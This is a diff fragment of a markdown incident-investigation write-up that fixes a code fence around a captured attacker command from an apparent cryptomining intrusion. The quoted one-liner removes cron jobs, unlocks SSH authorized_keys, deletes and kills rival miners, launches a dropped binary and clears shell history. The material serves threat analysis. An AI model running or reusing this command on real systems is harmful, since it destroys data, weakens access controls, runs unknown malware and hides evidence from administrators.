@@ -572,7 +572,7 @@ Investigation into linux program fix device yielded the same pattern of activity
 ```
 bash
 bash -c "crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak ; chattr -iae /var/tmp/Documents/.diicot ; chattr -iae /var/tmp/.update-logs/History ; chattr -iae /var/tmp/.update-logs/Update ; rm -rf /var/tmp/.update-logs /var/tmp/Documents ; mkdir /var/tmp/Documents > /dev/null 2>&1 ; cd /var/tmp/ ; pkill Opera ; rm -rf /var/tmp/Documents /var/tmp/.update-logs ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/ ; chmod 777 MNFleGNm ; ./MNFleGNm </dev/null &>/dev/null & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
-'''
+```
 ![image](https://github.com/user-attachments/assets/32a440fd-9970-4434-aa70-79694a86361c)
 ![image](https://github.com/user-attachments/assets/c31054ab-c0e8-44e0-9821-a500751a37cd)
 ![image](https://github.com/user-attachments/assets/eda92468-62ec-4575-b6e6-74476c5e593a)
